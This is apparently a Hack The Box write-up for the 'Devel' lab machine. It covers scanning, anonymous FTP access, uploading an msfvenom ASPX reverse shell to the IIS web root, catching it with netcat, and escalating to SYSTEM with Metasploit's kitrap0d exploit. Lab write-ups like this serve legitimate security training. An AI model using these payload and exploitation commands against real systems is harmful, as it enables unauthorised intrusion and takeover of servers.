![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5589512-0d6a-4e0a-b710-18590d01b0ff)

https://app.hackthebox.com/machines/Devel

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

Starting the enumeration phase, I performed a quick RustScan and found only two open ports: 21 (FTP) and 80 (HTTP).

```bash
sudo rustscan -a 10.10.10.5 -- -sC -sV -vv -oN devel_nmap
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ff1684db-3262-466b-b484-dfdcba244917)

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan results showed that anonymous FTP login was allowed, and there was a directory named "aspnet_client" present in the FTP server. Additionally, there was a Microsoft IIS web server running on port 80.

Upon checking the web server, I only found the IIS welcome image with no other significant content.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f2859949-8fcd-4faf-ac45-fab773bcb1b6)

I then performed Sub-directory enumeration using tools like GoBuster and FFUF didn't yield any useful results.

## Initial Access:

Proceeding with the enumeration, I decided to explore the FTP server as an anonymous user.

```bash
FTP -vv 10.10.10.5
```

The FTP directory revealed another folder named "system_web," which contained yet another folder named "2_0_50727."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/214a8c96-bade-4167-8854-a39b36e4d1a7)

Although subsequent sub-directory enumerations didn't provide any new findings, I speculated that since the FTP files and directories might be accessible from the web server as well, attempting to access the "aspnet_client" folder would lead to a 403 Forbidden error. This confirmed the availability of FTP files and directories on the web server.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b457bb85-5c4e-49f1-b38f-d7946b18fedf)

To gain initial access, I created an ASP-based reverse shell using MSFVenom, taking advantage of the "aspnet_client" folder on the FTP server. After uploading the reverse shell to the server using the PUT command.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ip_here LPORT=1337 -e x86/shikata_ga_nai -f aspx -o adv.aspx

PUT dawn.aspx
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6a571e08-d1d4-4c8d-aee2-c551af1fd50e)

I accessed the uploaded file from my web browser & successfully obtained a reverse shell running as the 'IIS web' user. 🙂

```bash
nc -lnvp 1337
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9d704370-4b41-4dbc-824d-5ab4bee2d8c4)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e10e0407-c1f5-4e88-9ce6-7c5c33f383c4)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Metasploit:

As my current privileges were insufficient to download files using standard tools such as curl, wget & Invoke-WebRequest, I decided to further exploit the system using Metasploit. First, I created a meterpreter payload and initiated Metasploit.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=10.10.14.128 LPORT=1337 -f aspx -o narnia.aspx

msfconsole
```

Setting the necessary options in Metasploit and starting the listener, I executed the payload and gained a meterpreter session.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/03cfe5d8-781a-4adb-8182-1d3d0c593722)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8fc48b78-91ca-44f1-9ce5-e338c9db229a)

After having the access, I used a module called "post/multi/recon/local_exploit_suggester" to identify potential privilege escalation vectors.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d014b2dd-accf-49f6-be95-b36597205ec5)

After selecting session option '1' and running the module, several possible privilege escalation exploits were suggested:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f23b6804-0c94-4c65-ae0b-037e1eefc142)

After the task is completed I got almost 15 exploits which appears to be vulnerable:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9ac95212-7dbb-4c38-b8e7-45e989eec342)

## Privilege Escalation:

The first exploit suggested, "bypass_uac," wouldn't work as my current user wasn't in the administrator group.

I chose not to use the "cve_2020_0787" exploit since it wouldn't be ethical to exploit a vulnerability that didn't exist at the time the box was released.

However, the "ms10_015_kitrap0d" exploit seemed promising for privilege escalation. Thus, I executed it.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/18bbb9fd-ac87-4f5b-8a3e-e38305e17f06)

Running the exploit resulted in another meterpreter session running with "NT Authority \System" privileges : (pwn3d! 🙂)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1b79cab2-5c49-4353-9a96-bc2a26626822)

With escalated privilege level, I gained access to sensitive files and directories, including both the user and root flags.
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/451de12e-683b-489a-8882-fe5bbba8ed8c)













